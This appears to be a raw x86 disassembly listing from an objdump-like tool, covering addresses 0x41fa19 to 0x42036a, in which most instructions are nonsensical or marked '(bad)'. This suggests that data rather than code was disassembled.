  41fa19:	outs   dx,DWORD PTR ds:[esi]
  41fa1a:	scas   eax,DWORD PTR es:[edi]
  41fa1b:	enter  0xc4a2,0x71
  41fa1f:	jns    0x41fa7b
  41fa21:	or     al,0x82
  41fa23:	dec    edi
  41fa24:	sti    
  41fa25:	sbb    esi,edx
  41fa27:	lock jmp 0x41fa89
  41fa2a:	pop    edi
  41fa2b:	pop    eax
  41fa2c:	and    eax,DWORD PTR [ebx+0x59cd38d3]
  41fa32:	mov    dl,0xf9
  41fa34:	js     0x41fa1f
  41fa36:	(bad)  
  41fa37:	cmp    cl,BYTE PTR ds:0xc3780910
  41fa3d:	mov    dl,0x15
  41fa3f:	pop    ss
  41fa40:	jl     0x41fa86
  41fa42:	das    
  41fa43:	rcr    DWORD PTR [edi-0x3c41d434],1
  41fa49:	push   esp
  41fa4a:	cmc    
  41fa4b:	js     0x41fa9e
  41fa4d:	cld    
  41fa4e:	repz add BYTE PTR [ecx+0x2743f788],bh
  41fa55:	cmp    BYTE PTR [edx-0x5f],bl
  41fa58:	dec    eax
  41fa59:	(bad)  
  41fa5a:	imul   ebp,DWORD PTR [eax],0x4b
  41fa5d:	push   0xb
  41fa5f:	or     ah,BYTE PTR ss:[eax-0x39827cf5]
  41fa66:	lods   al,BYTE PTR ds:[esi]
  41fa67:	sbb    dh,BYTE PTR [ecx+0x34dc3471]
  41fa6d:	cmp    eax,0x6524e044
  41fa72:	cli    
  41fa73:	scas   al,BYTE PTR es:[edi]
  41fa74:	loop   0x41fa32
  41fa76:	and    edi,0x76ecd7ca
  41fa7c:	dec    ebp
  41fa7d:	mov    ebx,0x1668ca3f
  41fa82:	ins    DWORD PTR es:[edi],dx
  41fa83:	sub    ch,BYTE PTR [ebx+ebp*1]
  41fa86:	sar    DWORD PTR [edx+eax*2+0x2c],1
  41fa8a:	(bad)  
  41fa8b:	cmp    BYTE PTR [ecx],al
  41fa8d:	rcl    bl,1
  41fa8f:	mov    ebx,0xab3579d1
  41fa94:	jle    0x41fadb
  41fa96:	push   esp
  41fa97:	lods   al,BYTE PTR ds:[esi]
  41fa98:	test   al,0x40
  41fa9a:	mov    esp,0x518a200e
  41fa9f:	leave  
  41faa0:	xchg   edx,eax
  41faa1:	out    dx,eax
  41faa2:	and    dl,al
  41faa4:	xchg   bh,bl
  41faa6:	cmp    BYTE PTR [edx+0x7f],dh
  41faa9:	loopne 0x41fa51
  41faab:	lea    edx,[esi+ecx*8+0x78]
  41faaf:	sahf   
  41fab0:	pop    ebx
  41fab1:	mov    cl,0xc9
  41fab3:	mov    al,0x57
  41fab5:	sub    DWORD PTR ds:0x9424b83a,edx
  41fabb:	mul    DWORD PTR [ecx-0x6bf2d4c7]
  41fac1:	ror    DWORD PTR [edx+0x4],1
  41fac4:	subps  xmm3,XMMWORD PTR [edx]
  41fac7:	(bad)  
  41fac8:	bound  ebx,QWORD PTR [esi-0x11]
  41facb:	test   DWORD PTR [edx+ebp*1+0x5ecedc0a],ecx
  41fad2:	xor    al,0x3d
  41fad4:	and    cl,BYTE PTR [eax]
  41fad6:	out    0xb2,eax
  41fad8:	adc    edi,ecx
  41fada:	cld    
  41fadb:	mov    esi,0x76a8db85
  41fae0:	lock push es
  41fae2:	inc    ecx
  41fae3:	ss dec edi
  41fae5:	mov    cl,0x94
  41fae7:	adc    al,0x24
  41fae9:	fist   WORD PTR [edi]
  41faeb:	push   esi
  41faec:	add    eax,0x922ea56d
  41faf1:	push   edi
  41faf2:	aad    0x11
  41faf4:	inc    edx
  41faf5:	adc    esi,edi
  41faf7:	pop    edx
  41faf8:	adc    BYTE PTR [eax+0x40d2a537],dl
  41fafe:	fmul   DWORD PTR [edx+0x72b5a5b4]
  41fb04:	xor    DWORD PTR [edx+0x29f40a26],0xcb913766
  41fb0e:	imul   eax,DWORD PTR [ebx],0xdfd87e0
  41fb14:	inc    esi
  41fb15:	les    esp,FWORD PTR [ebx]
  41fb17:	lea    ebp,[ebx+0x6b10e902]
  41fb1d:	mov    ds:0x4c906d3a,al
  41fb22:	mov    ah,0x72
  41fb24:	repz rcr DWORD PTR [eax+0x40],0x19
  41fb29:	cmp    cl,BYTE PTR [ecx+0x14]
  41fb2c:	dec    edi
  41fb2d:	add    bl,dl
  41fb2f:	into   
  41fb30:	loopne 0x41fba8
  41fb32:	inc    edi
  41fb33:	mov    BYTE PTR [ebx-0x6b49fcda],bh
  41fb39:	imul   edx,DWORD PTR [ecx],0x5c9649c1
  41fb3f:	sar    DWORD PTR [esi-0x380bbd46],cl
  41fb45:	or     al,0xfb
  41fb47:	jecxz  0x41fb03
  41fb49:	push   0xd4a0542c
  41fb4e:	inc    ebp
  41fb4f:	ds out dx,al
  41fb51:	out    0xad,eax
  41fb53:	cmp    ah,0x9a
  41fb56:	cld    
  41fb57:	jne    0x41fb01
  41fb59:	adc    edi,DWORD PTR [esi]
  41fb5b:	ja     0x41fb0b
  41fb5d:	not    bl
  41fb5f:	xchg   bh,dl
  41fb61:	in     eax,0x19
  41fb63:	or     eax,0xfadd62a2
  41fb68:	arpl   WORD PTR [ebp+0x2eb77878],ax
  41fb6e:	arpl   WORD PTR [edi-0x3b],dx
  41fb71:	sbb    edx,esi
  41fb73:	or     BYTE PTR [eax],ah
  41fb75:	mov    WORD PTR [esi*8-0xde30030],ds
  41fb7c:	je     0x41fb1c
  41fb7e:	mov    ?,WORD PTR [eax]
  41fb80:	mov    WORD PTR [ecx-0x1],ds
  41fb83:	mov    BYTE PTR [ebx+0x6e],bh
  41fb86:	pop    DWORD PTR [edx]
  41fb88:	jmp    0x41fb8f
  41fb8a:	xchg   DWORD PTR [eax+0x28],ecx
  41fb8d:	jg     0x41fb95
  41fb8f:	dec    ecx
  41fb90:	cmp    DWORD PTR [ebx+0x8c2f049],ebp
  41fb96:	and    al,0xb5
  41fb98:	ja     0x41fc11
  41fb9a:	sbb    ecx,ebp
  41fb9c:	sbb    al,0x6d
  41fb9e:	int3   
  41fb9f:	mov    bl,BYTE PTR [ecx-0x29]
  41fba2:	neg    eax
  41fba4:	sti    
  41fba5:	ja     0x41fb60
  41fba7:	sti    
  41fba8:	popf   
  41fba9:	sbb    edi,edx
  41fbab:	clc    
  41fbac:	sub    eax,DWORD PTR [eax+0x70]
  41fbaf:	fstp   st(3)
  41fbb1:	mov    BYTE PTR [edi-0x45],bl
  41fbb4:	jp     0x41fc0b
  41fbb6:	adc    cl,BYTE PTR [esi+0x3ddb66ed]
  41fbbc:	cld    
  41fbbd:	(bad)  
  41fbbe:	push   cs
  41fbbf:	or     eax,0x56ecd28
  41fbc4:	sbb    DWORD PTR [ebp+0x5c],ebx
  41fbc7:	jmp    0xc36b64d1
  41fbcc:	outs   dx,DWORD PTR ds:[esi]
  41fbcd:	push   esp
  41fbce:	push   edx
  41fbcf:	inc    ebp
  41fbd0:	popa   
  41fbd1:	inc    eax
  41fbd2:	add    dh,al
  41fbd4:	jle    0x41fbae
  41fbd6:	popa   
  41fbd7:	stos   BYTE PTR es:[edi],al
  41fbd8:	and    bh,BYTE PTR [edx]
  41fbda:	(bad)  
  41fbdb:	je     0x41fbe3
  41fbdd:	nop    DWORD PTR [edx]
  41fbe0:	push   ebx
  41fbe1:	xor    al,0x59
  41fbe3:	add    bh,BYTE PTR [ecx+0x43]
  41fbe6:	cmp    BYTE PTR [ebx],dl
  41fbe8:	sbb    eax,0xce7f3630
  41fbed:	xchg   BYTE PTR [edi+0xc],ch
  41fbf0:	cs gs fsub st(6),st
  41fbf4:	push   es
  41fbf5:	lahf   
  41fbf6:	hlt    
  41fbf7:	ins    BYTE PTR es:[edi],dx
  41fbf8:	and    esi,eax
  41fbfa:	push   es
  41fbfb:	mov    ch,0xfe
  41fbfd:	mov    al,ds:0x24835bf9
  41fc02:	mov    eax,ds:0xa128f1f9
  41fc07:	adc    bh,ch
  41fc09:	inc    esi
  41fc0a:	scas   al,BYTE PTR es:[edi]
  41fc0b:	sub    esp,DWORD PTR [edi]
  41fc0d:	inc    eax
  41fc0e:	xchg   ecx,eax
  41fc0f:	bound  ecx,QWORD PTR [eax+ecx*8-0x38]
  41fc13:	jo     0x41fba1
  41fc15:	mov    ch,BYTE PTR [ebp-0x12ce79f7]
  41fc1b:	or     al,0x6e
  41fc1d:	pop    ecx
  41fc1e:	jno    0x41fbb8
  41fc20:	iret   
  41fc21:	cli    
  41fc22:	in     eax,dx
  41fc23:	xchg   DWORD PTR [edi],ecx
  41fc25:	inc    edi
  41fc26:	adc    DWORD PTR [esi+0x18],edi
  41fc29:	out    dx,eax
  41fc2a:	leave  
  41fc2b:	cdq    
  41fc2c:	sbb    DWORD PTR [edx+0x1b],esi
  41fc2f:	mov    cl,0x13
  41fc31:	outs   dx,DWORD PTR ds:[esi]
  41fc32:	call   FWORD PTR ds:0xf848e79
  41fc38:	pop    ecx
  41fc39:	std    
  41fc3a:	or     dh,BYTE PTR [esi]
  41fc3c:	pop    ss
  41fc3d:	mov    dh,0x80
  41fc3f:	fiadd  WORD PTR [eax-0x1c]
  41fc42:	push   ebp
  41fc43:	ja     0x41fcaf
  41fc45:	les    eax,FWORD PTR [ebp+0x1fbdee25]
  41fc4b:	adc    BYTE PTR [ecx+eax*2-0x40],bh
  41fc4f:	push   edx
  41fc50:	hlt    
  41fc51:	mov    edi,0x4fec5082
  41fc56:	pop    ds
  41fc57:	jno    0x41fca1
  41fc59:	adc    dh,0x3b
  41fc5c:	ds loopne 0x41fc6f
  41fc5f:	sbb    BYTE PTR ds:0x59c9acbb,bl
  41fc65:	jp     0x41fcd6
  41fc67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc68:	and    dl,BYTE PTR [ecx+0xf]
  41fc6b:	jg     0x41fce5
  41fc6d:	lea    esp,[ecx+0x2b]
  41fc70:	or     edx,DWORD PTR [eax]
  41fc72:	daa    
  41fc73:	sbb    al,0x59
  41fc75:	scas   al,BYTE PTR es:[edi]
  41fc76:	add    ebx,eax
  41fc78:	push   cs
  41fc79:	(bad)  
  41fc7a:	addr16 pop esi
  41fc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc7d:	mov    ss,WORD PTR [edx-0x53]
  41fc80:	adc    ebx,0x61
  41fc83:	inc    esi
  41fc84:	addr16 mov ds:0xf65b,al
  41fc88:	sbb    bh,bl
  41fc8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc8b:	fcmovnbe st,st(4)
  41fc8d:	cmp    al,bh
  41fc8f:	inc    eax
  41fc90:	div    DWORD PTR [edi]
  41fc92:	mov    bh,0x24
  41fc94:	adc    DWORD PTR [esi+0x4],eax
  41fc97:	popa   
  41fc98:	pop    es
  41fc99:	xor    BYTE PTR [bx-0x2c],al
  41fc9d:	shl    DWORD PTR [edi],cl
  41fc9f:	xor    BYTE PTR [ebx+0x3c026ac3],bl
  41fca5:	add    esp,DWORD PTR [ecx-0x17774b67]
  41fcab:	das    
  41fcac:	xchg   ebp,eax
  41fcad:	lock mov cl,0xe2
  41fcb0:	adc    eax,0x888dbd3f
  41fcb5:	xor    al,0x9a
  41fcb7:	cmp    esi,esi
  41fcb9:	loop   0x41fc5a
  41fcbb:	(bad)  [ebx-0x6882768]
  41fcc1:	xchg   BYTE PTR [edx-0x9da9d9d],dl
  41fcc7:	cmp    dl,BYTE PTR [esi]
  41fcc9:	jmp    0xad910a9b
  41fcce:	shl    BYTE PTR [ecx+eax*2],cl
  41fcd1:	sbb    DWORD PTR [edx],edx
  41fcd3:	dec    ebx
  41fcd4:	fwait
  41fcd5:	inc    eax
  41fcd6:	xlat   BYTE PTR ds:[ebx]
  41fcd7:	aas    
  41fcd8:	pop    ss
  41fcd9:	retf   
  41fcda:	retf   
  41fcdb:	sbb    al,al
  41fcdd:	clc    
  41fcde:	shl    DWORD PTR [edx-0x2dee2163],cl
  41fce4:	or     eax,0x9b07522b
  41fce9:	mov    WORD PTR [ebx-0x57160665],?
  41fcef:	into   
  41fcf0:	test   al,0x82
  41fcf2:	adc    al,0xf8
  41fcf4:	aaa    
  41fcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcf6:	lods   eax,DWORD PTR ds:[esi]
  41fcf7:	lock js 0x41fca8
  41fcfa:	enter  0xf6c1,0x44
  41fcfe:	pop    ss
  41fcff:	xchg   ebx,eax
  41fd00:	cli    
  41fd01:	pop    esp
  41fd02:	adc    eax,DWORD PTR [ebx+0x48]
  41fd05:	dec    eax
  41fd06:	mov    DWORD PTR [ebx],0x1445a714
  41fd0c:	lods   eax,DWORD PTR ds:[esi]
  41fd0d:	mov    dl,0x41
  41fd0f:	inc    esp
  41fd10:	push   es
  41fd11:	mov    ebx,0xfa631c87
  41fd16:	xchg   esp,eax
  41fd17:	loopne 0x41fd00
  41fd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd1a:	push   es
  41fd1b:	push   es
	...
  41fef0:	daa    
  41fef1:	and    eax,0xbb873b85
  41fef6:	mov    edi,0xe22d13d
  41fefb:	pusha  
  41fefc:	call   0x176:0xab1dc47b
  41ff03:	add    BYTE PTR [esi],bl
  41ff05:	pop    es
  41ff06:	add    BYTE PTR [eax],al
  41ff08:	mul    bl
  41ff0a:	jmp    0x41feab
  41ff0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0d:	enter  0xb414,0x76
  41ff11:	inc    ebp
  41ff12:	cmc    
  41ff13:	and    esp,DWORD PTR [edi+ebx*8-0x4acaa31e]
  41ff1a:	fsub   DWORD PTR [edi-0x33]
  41ff1d:	popa   
  41ff1e:	fdivr  st,st(1)
  41ff20:	xchg   edx,eax
  41ff21:	xor    ebx,DWORD PTR [edx+0x3fbb4b]
  41ff27:	xor    esp,eax
  41ff29:	in     eax,0x2c
  41ff2b:	cdq    
  41ff2c:	dec    ebp
  41ff2d:	in     al,dx
  41ff2e:	and    BYTE PTR [ebx-0x56],ah
  41ff31:	shl    BYTE PTR [eax-0x3c],0xb1
  41ff35:	(bad)  
  41ff36:	sub    BYTE PTR [eax-0x16],ah
  41ff39:	fs (bad) 
  41ff3b:	shl    ah,cl
  41ff3d:	and    eax,0x5406b26e
  41ff42:	xor    DWORD PTR [ecx-0x775bf15],edi
  41ff48:	and    eax,0xd1d51280
  41ff4d:	mov    al,0xb1
  41ff4f:	shl    BYTE PTR [esi-0x17e04c51],cl
  41ff55:	scas   al,BYTE PTR es:[edi]
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	shl    al,1
  41ff59:	mov    dl,0x4a
  41ff5b:	fsub   QWORD PTR [edi]
  41ff5d:	js     0x41ffb8
  41ff5f:	jb     0x41ff2e
  41ff61:	ins    BYTE PTR es:[edi],dx
  41ff62:	call   0x7515dd5a
  41ff67:	out    dx,eax
  41ff68:	add    DWORD PTR [ebp+0x11],eax
  41ff6b:	imul   DWORD PTR [ebx]
  41ff6d:	dec    ebp
  41ff6e:	loopne 0x41ff1d
  41ff70:	jge    0x41ff33
  41ff72:	ret    
  41ff73:	sub    ch,al
  41ff75:	sbb    BYTE PTR [edx+0x20],0xde
  41ff79:	xchg   edi,eax
  41ff7a:	pop    ss
  41ff7b:	mov    edi,DWORD PTR gs:[eax]
  41ff7e:	pop    edi
  41ff7f:	add    BYTE PTR [ebx-0x15],bh
  41ff82:	push   eax
  41ff83:	dec    esi
  41ff84:	inc    ebp
  41ff85:	neg    esp
  41ff87:	outs   dx,BYTE PTR ds:[esi]
  41ff88:	loope  0x41ffd6
  41ff8a:	js     0x41ffb3
  41ff8c:	jmp    0x9113:0x6ce2c937
  41ff93:	jg     0x42000b
  41ff95:	sub    edi,DWORD PTR [edi]
  41ff97:	jne    0x41ff34
  41ff99:	jg     0x41ff6a
  41ff9b:	xchg   BYTE PTR [bp+si+0x2c],dh
  41ff9f:	shr    DWORD PTR [esi-0x3bc370e3],1
  41ffa5:	jp     0x41ff97
  41ffa7:	mov    dh,0x51
  41ffa9:	int3   
  41ffaa:	push   0xffffff9c
  41ffac:	clc    
  41ffad:	mov    ds:0x9068dc94,eax
  41ffb2:	push   0xfffffff0
  41ffb4:	pop    edi
  41ffb5:	in     al,dx
  41ffb6:	pop    ds
  41ffb7:	popf   
  41ffb8:	push   0xae72dea0
  41ffbd:	daa    
  41ffbe:	fidiv  DWORD PTR [edx-0x31b155e6]
  41ffc4:	jmp    0x61759775
  41ffc9:	leave  
  41ffca:	out    dx,eax
  41ffcb:	aaa    
  41ffcc:	test   ecx,eax
  41ffce:	dec    eax
  41ffcf:	hlt    
  41ffd0:	inc    esp
  41ffd1:	dec    esp
  41ffd2:	sbb    eax,0xf0c7703c
  41ffd7:	stos   BYTE PTR es:[edi],al
  41ffd8:	rcr    DWORD PTR [ebx+0x60],0x95
  41ffdc:	cmp    eax,0x733610cc
  41ffe1:	ret    
  41ffe2:	stc    
  41ffe3:	aas    
  41ffe4:	sar    BYTE PTR [eax+0x7a2331ad],0x32
  41ffeb:	push   0x467081f2
  41fff0:	cli    
  41fff1:	das    
  41fff2:	int3   
  41fff3:	dec    esp
  41fff4:	mov    ah,0x4
  41fff6:	paddusw mm1,QWORD PTR [eax-0x749bb13a]
  41fffd:	mov    ah,0x5d
  41ffff:	ja     0x42002b
  420001:	(bad)  
  420002:	and    eax,0xf503a0ba
  420007:	mov    BYTE PTR [eax-0x71],dh
  42000a:	push   ds
  42000b:	(bad)  
  42000c:	loop   0x41fff9
  42000e:	cmp    BYTE PTR [ebx+0x38],bl
  420011:	lea    ebx,[ecx+0x40]
  420014:	popf   
  420015:	or     BYTE PTR [edi],ah
  420017:	arpl   WORD PTR [esi],bp
  420019:	jl     0x42002d
  42001b:	nop
  42001c:	dec    ebp
  42001d:	fwait
  42001e:	icebp  
  42001f:	pop    ds
  420020:	jecxz  0x420022
  420022:	jae    0x41ffde
  420024:	xor    al,bh
  420026:	xor    DWORD PTR ds:0x8c22417,ebx
  42002c:	inc    esi
  42002d:	scas   al,BYTE PTR es:[edi]
  42002e:	shl    DWORD PTR [ebp-0x3d],cl
  420031:	mul    DWORD PTR [edx-0x5350305a]
  420037:	enter  0x4ef0,0x90
  42003b:	dec    ebp
  42003c:	cld    
  42003d:	call   0x73b9:0x71cbf7a7
  420044:	adc    al,0xba
  420046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420047:	ficom  DWORD PTR [ecx]
  420049:	cli    
  42004a:	out    0xa5,al
  42004c:	ret    0xf6a7
  42004f:	inc    eax
  420050:	push   cs
  420051:	out    dx,eax
  420052:	sbb    DWORD PTR [edx+ebx*1+0x29],edx
  420056:	sbb    ah,dl
  420058:	mul    BYTE PTR ds:0x37d7d52c
  42005e:	mov    DWORD PTR [esi+0x2e],ecx
  420061:	jbe    0x42009e
  420063:	mov    bl,0xb1
  420065:	inc    ecx
  420066:	mov    bl,0xf1
  420068:	and    DWORD PTR [ecx-0x2ac7958c],eax
  42006e:	inc    ebp
  42006f:	sbb    bh,BYTE PTR [ebx+edx*4-0x7d]
  420073:	test   al,0x5c
  420075:	pop    eax
  420076:	rcl    BYTE PTR [edi],0xc2
  420079:	cdq    
  42007a:	inc    ebx
  42007b:	pop    ebx
  42007c:	or     al,0xa
  42007e:	test   eax,0x1dfd66f9
  420083:	scas   eax,DWORD PTR es:[edi]
  420084:	push   es
  420085:	xchg   edi,edi
  420087:	adc    eax,0x9c92704b
  42008c:	jl     0x4200e7
  42008e:	adc    DWORD PTR [edx-0x3cefa607],edi
  420094:	into   
  420095:	or     eax,0xa69e2699
  42009a:	out    dx,al
  42009b:	adc    bl,BYTE PTR ss:[edi-0x41e3fca6]
  4200a2:	xor    edx,DWORD PTR [esi+0x4f]
  4200a5:	mov    WORD PTR [eax-0x37eb4cdf],gs
  4200ab:	fistp  QWORD PTR [ebx]
  4200ad:	scas   eax,DWORD PTR es:[edi]
  4200ae:	sbb    al,0x4c
  4200b0:	mov    edx,0xe382a6eb
  4200b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200b6:	mov    eax,ds:0x30f32016
  4200bb:	xchg   DWORD PTR [edi+0x45060700],edx
  4200c1:	push   cs
  4200c2:	sbb    DWORD PTR [edx-0x531fef5d],ecx
  4200c8:	lods   al,BYTE PTR ds:[esi]
  4200c9:	mov    ch,0x5c
  4200cb:	in     al,0x52
  4200cd:	dec    ebx
  4200ce:	ds sbb al,0x5d
  4200d1:	imul   ecx,edi,0x7
  4200d4:	jne    0x420142
  4200d6:	pop    ss
  4200d7:	mov    WORD PTR [ebx-0x6213b922],fs
  4200dd:	bound  ebx,QWORD PTR [edx]
  4200df:	dec    eax
  4200e0:	adc    bh,BYTE PTR [esi]
  4200e2:	loope  0x4200bf
  4200e4:	aad    0x5b
  4200e6:	mov    ds:0xc6311860,al
  4200eb:	test   cl,0xab
  4200ee:	scas   eax,DWORD PTR es:[edi]
  4200ef:	or     BYTE PTR [ecx+0x23240d30],0x2a
  4200f6:	in     al,dx
  4200f7:	ins    BYTE PTR es:[edi],dx
  4200f8:	xor    BYTE PTR ds:0xa6449b87,bl
  4200fe:	aaa    
  4200ff:	mov    esp,0x4d64a440
  420104:	cmp    DWORD PTR [eax+0x520c727f],edi
  42010a:	sub    BYTE PTR [eax-0x646255e5],cl
  420110:	push   edx
  420111:	dec    ecx
  420112:	pop    es
  420113:	ror    BYTE PTR [esi+0x1b65dbd8],cl
  420119:	xor    dh,cl
  42011b:	test   eax,ecx
  42011d:	fs sub al,0x60
  420120:	cld    
  420121:	cld    
  420122:	mov    bh,0x83
  420124:	popf   
  420125:	sbb    al,0xe6
  420127:	ret    
  420128:	(bad)
  42012c:	dec    esp
  42012d:	nop
  42012e:	in     al,dx
  42012f:	in     al,dx
  420130:	lods   al,BYTE PTR ds:[esi]
  420131:	mov    al,ds:0x9cdaa8ec
  420136:	jl     0x4200c3
  420138:	nop
  420139:	fisub  DWORD PTR [ecx-0x6c6d839b]
  42013f:	sti    
  420140:	add    eax,ecx
  420142:	sub    eax,DWORD PTR ds:0xd1965847
  420148:	loop   0x420199
  42014a:	push   0xffffffb3
  42014c:	or     BYTE PTR [ebx+0x31],cl
  42014f:	or     BYTE PTR [ebx+0xdae2bdf],cl
  420155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420156:	lea    ecx,[ecx]
  420158:	cli    
  420159:	pushf  
  42015a:	mov    al,0xf7
  42015c:	mov    esp,0xd2e35771
  420161:	jbe    0x420116
  420163:	daa    
  420164:	mov    ecx,0xde53371e
  420169:	sbb    ch,BYTE PTR [edi+0x2430c02e]
  42016f:	push   ebx
  420170:	sbb    BYTE PTR [edi+0x5ffe19a],ch
  420176:	mov    ch,0xcd
  420178:	mov    esi,DWORD PTR [ebp+edi*2-0x19d8678e]
  42017f:	ss pop ebx
  420181:	hlt    
  420182:	ret    
  420183:	push   ecx
  420184:	sti    
  420185:	lds    ebp,FWORD PTR [ebx]
  420187:	rol    DWORD PTR [ecx-0x1],0xc
  42018b:	mov    ds:0x79abda5e,al
  420190:	cs jne 0x420194
  420193:	mov    esp,0xfbec0a45
  420198:	pop    edi
  420199:	clc    
  42019a:	sbb    edi,DWORD PTR [ebp-0x32]
  42019d:	xchg   edi,eax
  42019e:	push   edx
  42019f:	int    0x49
  4201a1:	in     eax,dx
  4201a2:	sub    DWORD PTR [edi-0x5d1baac4],ebp
  4201a8:	jmp    0x70b96e01
  4201ad:	inc    ebp
  4201ae:	jo     0x420220
  4201b0:	sar    BYTE PTR [ecx+0x52],0x2f
  4201b4:	pop    edx
  4201b5:	pusha  
  4201b6:	jl     0x420152
  4201b8:	xor    BYTE PTR ds:0x4b041161,bh
  4201be:	sar    BYTE PTR [esi+0x736daaf3],0xd1
  4201c5:	js     0x4201d3
  4201c7:	cmp    DWORD PTR [eax],ebp
  4201c9:	mov    ecx,0x16b2ca27
  4201ce:	aad    0x55
  4201d0:	js     0x4201c9
  4201d2:	cmp    BYTE PTR [edi+0x14320ea3],ch
  4201d8:	mov    bh,BYTE PTR [edx+ecx*1+0x63]
  4201dc:	jbe    0x4201a4
  4201de:	push   eax
  4201df:	ftst   
  4201e1:	sub    al,0xdc
  4201e3:	xor    eax,0x90e40c66
  4201e8:	fs dec esi
  4201ea:	mov    dh,0xa5
  4201ec:	retf   0x9a15
  4201ef:	(bad)  
  4201f0:	xchg   ebp,eax
  4201f1:	pop    edi
  4201f2:	mov    eax,0x5bf2860f
  4201f7:	out    dx,eax
  4201f8:	icebp  
  4201f9:	std    
  4201fa:	test   DWORD PTR [edx],ebx
  4201fc:	psrlw  mm1,QWORD PTR [ebp-0x9]
  420200:	shl    DWORD PTR [ecx],cl
  420202:	push   ss
  420203:	inc    ecx
  420204:	ds (bad) 
  420207:	adc    dh,BYTE PTR [ebx]
  420209:	xor    eax,0x59f0b962
  42020e:	jbe    0x42023f
  420210:	ja     0x420241
  420212:	mov    al,0xff
  420214:	push   0x7fc4a151
  420219:	je     0x420284
  42021b:	mov    eax,0xd2f874f1
  420220:	jno    0x4201c5
  420222:	add    edx,DWORD PTR [ebp+0x721782a1]
  420228:	leave  
  420229:	dec    ebx
  42022a:	add    edx,DWORD PTR [edx-0x4a2f8aca]
  420230:	jge    0x4201f8
  420232:	mov    ds:0xe42f5db3,eax
  420237:	add    dh,0x20
  42023a:	and    eax,0xc0605bbe
  42023f:	fwait
  420240:	jne    0x420202
  420242:	loope  0x420229
  420244:	dec    eax
  420245:	adc    eax,0x343ea3bf
  42024a:	mov    esp,0x7f928f51
  42024f:	dec    ebx
  420250:	mov    bh,0x94
  420252:	repz int 0xcb
  420255:	xlat   BYTE PTR ds:[ebx]
  420256:	pop    esp
  420257:	cmp    eax,0x9952e4a7
  42025c:	scas   al,BYTE PTR es:[edi]
  42025d:	hlt    
  42025e:	popa   
  42025f:	lds    ebp,FWORD PTR [edi+0x60]
  420262:	inc    esp
  420263:	stos   DWORD PTR es:[edi],eax
  420264:	dec    ebp
  420265:	pop    esp
  420266:	frstor [esi-0x671ba0b5]
  42026c:	bound  esp,QWORD PTR [edx+0x26]
  42026f:	xor    edi,DWORD PTR [edx]
  420271:	dec    BYTE PTR [edx+0x4f]
  420274:	fucomip st,st(1)
  420276:	jbe    0x4202b7
  420278:	dec    esp
  420279:	test   BYTE PTR [ebx-0x2407f00d],ch
  42027f:	push   edi
  420280:	cld    
  420281:	into   
  420282:	mov    ah,0xd0
  420284:	or     BYTE PTR [eax-0xf],ah
  420287:	in     al,0x22
  420289:	add    al,0xe9
  42028b:	mov    cl,0x34
  42028d:	es aas 
  42028f:	fimul  DWORD PTR [ebp-0x48a7f0c9]
  420295:	cmp    bl,BYTE PTR ds:[ecx+0x41]
  420299:	stc    
  42029a:	cdq    
  42029b:	test   al,0x9f
  42029d:	sub    eax,0xc71d3334
  4202a2:	and    DWORD PTR [ebp-0x4c7354dc],0x53ee0795
  4202ac:	outs   dx,BYTE PTR ds:[esi]
  4202ad:	add    al,0xd2
  4202af:	fdiv   DWORD PTR [esi]
  4202b1:	pop    ebp
  4202b2:	mov    edx,0xe617fd75
  4202b7:	daa    
  4202b8:	inc    eax
  4202b9:	int    0xad
  4202bb:	or     DWORD PTR ds:0x650773eb,esp
  4202c1:	imul   ebx,DWORD PTR [ecx-0x3e],0xa6928d0e
  4202c8:	aaa    
  4202c9:	or     BYTE PTR [ebx-0x463121a4],bl
  4202cf:	hlt    
  4202d0:	shr    BYTE PTR [edx-0x501429af],1
  4202d6:	div    BYTE PTR [esi]
  4202d8:	imul   BYTE PTR [ebp+0x6c]
  4202db:	scas   eax,DWORD PTR es:[edi]
  4202dc:	cwde   
  4202dd:	aas    
  4202de:	sub    ebp,ebx
  4202e0:	stc    
  4202e1:	pop    edi
  4202e2:	mov    ecx,0xa61fed6b
  4202e7:	ror    BYTE PTR [eax],0xf1
  4202ea:	int    0x69
  4202ec:	push   esi
  4202ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ee:	pop    ecx
  4202ef:	mov    bl,0x19
  4202f1:	nop
  4202f2:	cmp    al,0x70
  4202f4:	je     0x4202c7
  4202f6:	inc    edi
  4202f7:	mov    eax,edx
  4202f9:	mov    eax,0xcb63d141
  4202fe:	arpl   WORD PTR [edx-0x38],bp
  420301:	scas   al,BYTE PTR es:[edi]
  420302:	mov    esi,0xdb27b1c7
  420307:	cli    
  420308:	(bad)  
  420309:	push   ebp
  42030a:	out    0x79,al
  42030c:	push   ecx
  42030d:	pusha  
  42030e:	inc    eax
  42030f:	or     bh,BYTE PTR [edx]
  420311:	ret    
  420312:	xor    al,0x17
  420314:	daa    
  420315:	jnp    0x4202db
  420317:	inc    ebp
  420318:	sub    DWORD PTR [ebx],esi
  42031a:	push   esi
  42031b:	mov    edx,0x61fa17
  420320:	cmp    edx,DWORD PTR [ebp+0x56]
  420323:	sbb    edx,DWORD PTR ds:0xad3a8be2
  420329:	mov    cl,0x9c
  42032b:	rol    ch,0xdf
  42032e:	je     0x4202dc
  420330:	push   cs
  420331:	lods   al,BYTE PTR ds:[esi]
  420332:	xor    al,BYTE PTR [ecx-0x3f280020]
  420338:	test   dh,dh
  42033a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42033b:	stos   BYTE PTR es:[edi],al
  42033c:	sti    
  42033d:	add    ebx,DWORD PTR [edi+edx*1+0x7b8cc9d9]
  420344:	jmp    0xd6e9:0x884c64b8
  42034b:	imul   esp,DWORD PTR [ecx+0x5fb6a965],0x738fd9af
  420355:	xchg   esi,eax
  420356:	shl    BYTE PTR [ecx+0x3404f5bd],0xbd
  42035d:	mov    ebp,0x4f1838cd
  420362:	add    eax,0xe46954d2
  420367:	int3   
  420368:	push   0xffffffc5
  42036a:	mov    ah,BYTE PTR [edx+ebp*1]
